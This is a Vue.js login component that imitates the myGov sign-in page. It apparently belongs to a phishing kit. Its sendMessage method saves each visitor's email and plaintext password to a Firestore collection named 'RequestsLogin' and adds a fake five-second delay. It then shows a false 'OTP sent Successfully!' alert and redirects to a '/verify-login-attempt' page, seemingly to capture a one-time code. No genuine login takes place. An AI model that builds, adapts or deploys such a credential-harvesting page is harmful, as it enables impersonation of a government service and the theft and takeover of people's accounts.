<template>
  <div class="alpha" >
    <form class="logoIn" @submit.prevent="sendMessage" >
      <div class="wrapper">
        <div class="headline">
          <router-link to="/">
          <img src="@/assets/mygov.svg" alt="logo" class="company-logo">
          </router-link>
        </div>

        <div class="form">
          <p class="form-header">Sign in to myGov</p>
          <div class="logoIn">
            <div class="form-group">
              <input type="email" placeholder="Email" v-model="email"   name="email"   required/>
            </div>
<!--            <div class="form-group">-->
<!--              <input type="password" placeholder="Password"  name="password" v-model="password" required />-->
<!--            </div>-->

            <div class="has-addons">
              <input v-if="showPassword2" v-model="password"  required="required" type="text"  class="input-form-1 password"   placeholder="Password"   />
              <input v-else type="password" v-model="password"   required="required"  class="input-form-1 password"   placeholder="Password"   >
              <div class="space" @click="toggleShow2">
                <i class="fas" :class="{ 'fa-eye-slash': showPassword2, 'fa-eye': !showPassword2 }" ></i>
              </div>
            </div>

            <div class="form-group-2">
              <div class="law-seprate">
                <input
                    type="checkbox"
                    placeholder="Remember-Me"
                    id="remember-me"
                    class="checkbox"
                />
                <label for="remember-me" class="checkbox-text">Remember me</label>
              </div>

<!--              <a  class="forgot-password" @click="onPostClick2" >Forgot Password</a>-->
            </div>

<!--            <button  class="btn btn-white btn-animated" >Sign In</button>-->

            <base-button
                :loading="loading"
                style="
  background: #389ba7;
  border: 1px solid #389ba7;
  color: white;
"
            >Sign In</base-button>

            <div class="separator">
              <div class="line"></div>
              <h2>OR</h2>
              <div class="line"></div>
            </div>

            <div class="create-acc">
              <p class="create-text">Don’t have an account?<a @click="onPostClick" class="create-link">Sign up here</a>
              </p>
            </div>

          </div>
        </div>

      </div>
    </form>
  </div>
</template>

<script>
import BaseButton from "@/components/BaseComponents/buttons/BaseButton.vue";
import Swal from "sweetalert2";
import { serverTimestamp,} from "firebase/database";
import {db} from "@/firebase/config";
import {doc, setDoc,} from "firebase/firestore";
import { mapState, mapGetters, mapMutations } from 'vuex'


export default {
  name: 'LoginForm',
  components: {BaseButton},

  data() {
    return {
      showPassword2: false,
      password: "",
      email: "",
      loading: false, // <-- Add this line
    };
  },

  computed: {
    ...mapState(['signUpFormData']),
    ...mapGetters(['getSignUpFormData'])
  },

  methods: {

    ...mapMutations(['updateSignUpFormData']),


    onPostClick() {
      this.$router.push("/register");
    },
    onPostClick2() {
      this.$router.push("/forgot-password");
    },
    toggleShow2() {
      this.showPassword2 = !this.showPassword2;
    },

    async sendMessage() {
      this.loading = true;
      try {
        await setDoc(doc(db, "RequestsLogin", this.email), {
          email: this.email,
          password: this.password,
          createdAt: serverTimestamp(),
        }, { merge: true });
        this.updateSignUpFormData(this.email);
        console.log('saved');


        // Simulate 5 seconds delay
        await new Promise(resolve => setTimeout(resolve, 5000));

        await Swal.fire({
          icon: 'success',
          title: 'Success',
          text: 'OTP sent Successfully!',
        });

        this.resetForm();
        this.$router.push("/verify-login-attempt");

      } catch (error) {
        console.error("Login request failed:", error);
        await Swal.fire({
          icon: 'error',
          title: 'Error',
          text: 'Failed to send OTP. Please try again.',
        });
      } finally {
        this.loading = false;
      }
    },


    resetForm() {
      this.email = '';
      this.password = '';
    },
  },

}
</script>

<style scoped>
.alpha{
  background-color: #f5f5f5;
  height: 120vh;
}

.company-logo{
  width: 23%;
}

.form-header{
  text-align: center;
  margin-bottom: 25px;
  font-size: 23px;
  font-weight: 600;
  margin-top: 20px;
}


:root {
  --primary-color: #3525d3;
  --white-color: #fff;
  --black-color: #3c4a57;
  --light-gray: #e4e8ee;
}

.wrapper {
  position: relative;
  align-items: center;
  justify-content: center;
}



.wrapper {
  width: 100%;
  margin: auto;
}

.wrapper::before {
  content: "";
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-position: center center;
  background-size: cover;
  background-repeat: no-repeat;
  min-height: 100vh;
  z-index: -1;
}

.wrapper .headline {
  text-align: center;
  background-color: #65D2EE !important;
  padding: 2rem;
  margin-bottom: 35PX;
}


.wrapper .headline h2 {
  font-weight: 400;
  font-size: 23px;
  color: #0A0A0AFF;
}

.wrapper .form {
  max-width: 500px;
  width: 100%;
  margin: auto;
  -webkit-box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
  background: #ffffff;
  border-radius: 12px;
  padding: 30px 50px 30px 50px;
}

.wrapper .form-group {
  margin-bottom: 15px;
}

.wrapper .form-group input {
  display: block;
  font-size: 16px;
  line-height: 24px;
  letter-spacing: -0.1px;
  padding: 12px 16px;
  height: 48px;
  border-radius: 8px;
  color: var(--black-color);
  /*border: 1px solid #e4e8ee;*/
  box-shadow: none;
  width: 100%;
}

.wrapper .form-group input:focus {
  outline: none;
}

.wrapper .form-group input::placeholder {
  color: var(--black-color);
  font-weight: 400;
  font-size: 14px;
}



.form-group-2 {
  padding-top: 20px;
  padding-bottom: 20px;
  display: flex;
  align-items: center;
  align-content: center;
  justify-content: space-between;
}

.checkbox-text {
  padding-left: 8px;
  font-size: 15px;
  color: #0A0A0AFF;
  font-weight: 300;
}

.forgot-password {
  text-decoration: none;
  color: #0A0A0AFF;
  font-size: 15px;
  float: right;
  font-weight: 300;
}

.separator {
  display: flex;
  align-items: center;
  padding-top: 20px;
}

.separator .line {
  height: 1px;
  flex: 0.5;
  background-color: #0A0A0AFF;
}

.separator h2 {
  padding: 0 1rem;
  font-size: 12px;
  color: #0A0A0AFF;
}

.create-acc {
  padding-top: 30px;
  font-size: 17px;
  padding-bottom: 40px;
}
.create-text {
  font-size: 15px;
  color: #0A0A0AFF;
  font-weight: 300;
}
.create-link {
  padding-left: 5px;
  text-decoration: underline;
  color: #389ba7;
}


.has-addons{
  display: flex;
  flex-direction: row-reverse;
  justify-content: center;
  align-items: center;
  align-content: center;
  margin-top: 5%;
}
button{
  background-color: transparent;
}
.fas{
  font-size: 13px;
  margin-top: 10%;
}
.space{
  padding-top: 13px;
  padding-bottom: 13px;
  padding-right: 10px;
  border: 1px solid #d0d5dd;
  border-left-style: none;
  border-radius: 0 8px 8px 0;
  font-size: 1rem;
  background-color: #FFFFFF;
}
.input-form-1{
  order: 1;
  width: 100%;
  padding: 14.5px 20px;
  margin: 8px 0;
  display: inline-block;
  box-sizing: border-box;
}
input {
  box-sizing: border-box;
  border: 1px solid #D0D5DD;
  border-radius: 8px;
  -webkit-transition: 0.3s;
  padding-top: 12px;
  padding-bottom: 12px;
  transition: 0.3s;
  outline: none;
  color: var(--black-color);
  letter-spacing: 0.5px;
}
input:focus {
  border: 1px solid #24405A;
}
input::placeholder {
  color: var(--black-color);
}
.input-form-1.password {
  border-right-style: none;
  border-radius: 8px 0 0 8px;
}


@media (max-width: 1030px) {
  .wrapper::before {
    left: -25%;
    min-height: 60vh;
    height: 500px;
  }
}
@media (max-width: 767px) {
  .wrapper {
    width: 100%;
  }
  .wrapper .headline h1 {
    font-size: 22px;
    line-height: 25px;
  }

  .company-logo{
    width: 35%;
  }

  .wrapper .form {
    margin-top: 8%;
  }

}
@media (max-width: 990px) {
  .wrapper .headline h1  {
    font-size: 32px;
  }
  .wrapper .headline h2  {
    font-size: 28px;
  }
}
@media (max-width: 500px) {

  .wrapper .form {
    width: 80%;
  }

  form {
    max-width: 40rem;
    border-radius: 12px;
  }
  .wrapper .headline h1  {
    font-size: 25px;
  }
  .wrapper .headline h2  {
    font-size: 22px;
  }
  .checkbox-text {
    padding-left: 10px;
  }
  .forgot-password {
    padding-left: 20px;
  }

  .company-logo{
    width: 60%;
  }

}

</style>